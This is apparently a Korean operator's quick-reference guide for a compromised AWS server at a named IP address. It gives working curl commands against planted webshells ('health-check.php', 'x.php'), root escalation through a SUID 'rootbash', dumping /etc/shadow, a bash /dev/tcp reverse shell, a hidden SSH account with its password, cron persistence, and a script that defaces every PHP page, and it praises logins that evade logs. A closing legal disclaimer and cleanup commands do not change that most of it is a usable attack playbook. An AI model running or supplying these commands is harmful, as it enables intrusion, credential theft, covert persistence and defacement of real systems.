# 🎯 빠른 사용 가이드 요약

## 📌 현재 상태
- **타겟:** 52.78.221.104 (AWS EC2)
- **권한:** ✅ ROOT 접근 가능
- **백도어:** ✅ 다중 백도어 설치됨
- **웹쉘:** ✅ x.php, health-check.php, system-check.php

---

## 🚀 가장 많이 사용하는 명령어들

### 1️⃣ 백도어로 명령 실행 (가장 기본)
```bash
# 일반 명령
curl "http://52.78.221.104/health-check.php?x=whoami"
curl "http://52.78.221.104/health-check.php?x=id"
curl "http://52.78.221.104/health-check.php?x=ls%20-la"

# 루트 명령
curl "http://52.78.221.104/health-check.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'whoami'"
curl "http://52.78.221.104/health-check.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'cat%20/etc/shadow'"
```

### 2️⃣ 전체 사이트를 해킹 페이지로 교체
```bash
cd /Users/hwangjunha/Desktop/Red_basic_local/H

# 자동 스크립트 실행 (모든 PHP 파일 교체)
python3 fin/exploits/06_전체_디페이스.py

# "yes" 입력하면:
# ✅ 모든 PHP 파일 찾기
# ✅ 자동 백업
# ✅ 전체 해킹 페이지로 교체
# ✅ 에러 페이지도 교체
```

**결과 확인:**
```bash
open http://52.78.221.104/
open http://52.78.221.104/login.php
open http://52.78.221.104/profile.php
# 모든 페이지가 해킹 페이지(해골 애니메이션)로 표시됨
```

### 3️⃣ 리버스 쉘 (대화형 쉘)
```bash
# 1단계: 공격자 PC에서 리스너 시작
nc -lvnp 4444

# 2단계: 다른 터미널에서 연결 트리거
curl "http://52.78.221.104/health-check.php?x=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/YOUR_IP/4444%200>%261'"

# 3단계: 연결되면 루트 권한 획득
/var/www/html/www/uploads/rootbash -p
whoami  # root
```

### 4️⃣ SSH로 직접 접속 (숨겨진 사용자)
```bash
# 먼저 사용자 생성 (한 번만 실행)
python3 fin/exploits/05_full_takeover.py
# 메뉴에서 3번 선택 (Setup Persistence)

# 접속
ssh sysupdate@52.78.221.104
# Password: Update@2025!

# 로그인 후
sudo su -  # 루트 권한
```

### 5️⃣ 고급 백도어 사용 (웹 인터페이스)
```bash
# 브라우저로 접속:
open http://52.78.221.104/persistent_backdoor.php#access

# Password: HackThePlanet2025!

# 기능:
# - 명령 실행
# - 파일 업로드
# - 리버스 쉘
# - PHP 코드 실행
```

---

## 🎬 시나리오별 사용법

### 시나리오 A: 빠르게 명령 실행하고 싶을 때
```bash
curl "http://52.78.221.104/health-check.php?x=명령어"
```
- IP 바뀌어도 OK
- 방화벽 우회 (HTTP 80 포트)
- 가장 간단

### 시나리오 B: 대화형으로 작업하고 싶을 때
```bash
# 리버스 쉘 사용
nc -lvnp 4444  # 리스너

# 연결 후
/var/www/html/www/uploads/rootbash -p  # 루트
```
- 실시간 명령 입력 가능
- 파이프라인, 리다이렉션 사용 가능

### 시나리오 C: 안전하게 SSH로 접속하고 싶을 때
```bash
ssh sysupdate@52.78.221.104
# Password: Update@2025!
```
- 정상적인 SSH 접속처럼 보임
- 로그에서 눈에 띄지 않음

### 시나리오 D: 전체 사이트를 해킹 페이지로 만들고 싶을 때
```bash
python3 fin/exploits/06_전체_디페이스.py
# yes 입력
```
- 모든 PHP 파일 자동 교체
- 원본은 자동 백업
- 해골 + 매트릭스 애니메이션

---

## 🔄 IP가 바뀌면?

### ✅ 계속 사용 가능한 것:
- **웹 백도어** (URL만 접속)
  ```bash
  curl "http://52.78.221.104/health-check.php?x=whoami"
  ```
- **SSH 접속**
  ```bash
  ssh sysupdate@52.78.221.104
  ```
- **브라우저 백도어**
  ```
  http://52.78.221.104/persistent_backdoor.php#access
  ```

### ⚠️ 업데이트 필요한 것:
- **리버스 쉘** (새 IP 입력 필요)
  ```bash
  # 새 IP로 변경
  curl "http://52.78.221.104/health-check.php?x=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/NEW_IP/4444%200>%261'"
  ```

---

## 📝 주요 파일 위치

### 서버 (52.78.221.104):
```
/var/www/html/www/uploads/x.php          # 원본 웹쉘
/var/www/html/www/health-check.php        # 백도어 1
/var/www/html/www/system-check.php        # 백도어 2
/var/www/html/www/uploads/rootbash        # SUID 바이너리
/dev/shm/rootbash                         # SUID 바이너리 (메모리)
/var/tmp/rootbash                         # SUID 바이너리 (영구)
/etc/cron.d/persist*                      # Cron 백도어
/root/backup_*                            # 원본 파일 백업
```

### 로컬 PC:
```
fin/exploits/01_auto_scanner.py           # 취약점 스캐너
fin/exploits/06_전체_디페이스.py          # 전체 디페이스
fin/exploits/05_full_takeover.py          # 전체 장악
fin/backdoors/persistent_backdoor.php     # 고급 백도어
fin/defacement/hacked_page.html           # 해킹 페이지
fin/reports/FULL_ATTACK_REPORT.md         # 전체 보고서
```

---

## 🛡️ 복구 방법 (테스트 후)

### 디페이스 복구:
```bash
# 자동 백업에서 복구
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'cp%20-r%20/root/backup_*/*.php%20/var/www/html/www/'"
```

### 백도어 제거:
```bash
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'rm%20-f%20/var/www/html/www/health-check.php'"
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'rm%20-f%20/var/www/html/www/system-check.php'"
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'rm%20-f%20/etc/cron.d/persist*'"
curl "http://52.78.221.104/uploads/x.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'userdel%20-r%20sysupdate'"
```

---

## ⚡ 자주 하는 실수

### ❌ 잘못된 방법:
```bash
# URL 인코딩 안 함
curl "http://52.78.221.104/health-check.php?x=ls -la"  # 실패

# rootbash 없이 root 명령 실행
curl "http://52.78.221.104/health-check.php?x=cat /etc/shadow"  # Permission denied
```

### ✅ 올바른 방법:
```bash
# URL 인코딩 사용
curl "http://52.78.221.104/health-check.php?x=ls%20-la"

# rootbash로 root 명령 실행
curl "http://52.78.221.104/health-check.php?x=/var/www/html/www/uploads/rootbash%20-p%20-c%20'cat%20/etc/shadow'"
```

---

## 🎯 한 줄 요약

```bash
# 명령 실행
curl "http://52.78.221.104/health-check.php?x=명령"

# 전체 디페이스
python3 fin/exploits/06_전체_디페이스.py

# 리버스 쉘
nc -lvnp 4444  # 리스너
curl "http://52.78.221.104/health-check.php?x=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/IP/4444%200>%261'"

# SSH 접속
ssh sysupdate@52.78.221.104  # Password: Update@2025!
```

---

## 📚 더 자세한 내용

- **전체 공격 과정:** `fin/reports/FULL_ATTACK_REPORT.md`
- **배포 가이드:** `fin/DEPLOYMENT_GUIDE.md`
- **상세 사용법:** `fin/README.md`

---

## ⚠️ 중요 주의사항

이 도구들은 **오직** 다음 목적으로만 사용하세요:
- ✅ 합법적인 침투 테스트
- ✅ 서면 승인을 받은 보안 평가
- ✅ 교육/연구 목적

불법 사용 시:
- 🚫 정보통신망법 위반 (5년 이하 징역)
- 🚫 컴퓨터범죄 (10년 이하 징역)
- 🚫 민사상 손해배상

**윤리적 해킹 원칙을 준수하세요!**
